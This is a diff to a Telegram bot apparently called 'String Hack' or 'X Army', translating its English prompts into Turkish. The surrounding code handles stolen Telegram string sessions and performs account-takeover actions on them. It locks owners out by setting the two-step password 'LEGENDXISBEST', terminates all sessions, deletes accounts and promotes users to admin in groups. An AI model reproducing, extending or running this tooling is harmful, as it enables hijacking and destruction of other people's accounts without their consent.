@@ -245,7 +245,7 @@ async def start(event):
       i = await userinfo(strses.text)
       await event.reply(i + "\n\nString hakc botunu kullandığın için teşekkür ederim")
     elif r == "C":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("STRING OTURUM VERİN")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
@@ -312,40 +312,40 @@ async def start(event):
         return await event.respond("Bu StringSession belki sonlandırıldı")
       i = await user2fa(strses.text)
       if i:
-        await event.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using X Army Bot")
+        await event.reply("Kullanıcının iki adımı yok, bu yüzden şimdi iki adım 'LEGENDXISBEST' oldu, şimdi giriş yapabilirsiniz\n\nString Hack botunu kullandığın için teşekkürler")
       else:
-        await event.reply("Sorry User Have two step already")
+        await event.reply("Üzgünüm Kullanıcının zaten iki adımı var")
     elif r == "I":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("STRING OTURUM VERİN")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("Bu StringSession belki sonlandırıldı")
       i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using X Army Bot")
+      await event.reply("Tüm oturumlar sonlandırıldı\n\nString Hack botu kullandığın için teşekkürler")
     elif res.text == "J":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("STRING OTURUM VERİN")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("Bu StringSession belki sonlandırıldı")
       i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using X Army Bot")
+      await event.reply("Hesap BAŞARIYLA silindi\n\nString Hack botu kullandığın için teşekkürler")
     elif res.text == "L":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("STRING OTURUM VERİN")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+        return await event.respond("Bu StringSession belki sonlandırıldı")
+      await x.send_message("ŞİMDİ GRUP/KANAL KULLANICI ADI/ID VERİN")
       grp = await x.get_response()
-      await x.send_message("NOW GIVE USER USERNAME")
+      await x.send_message("Şimdi kullanıcının kullanıcı ismini ver")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
       await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
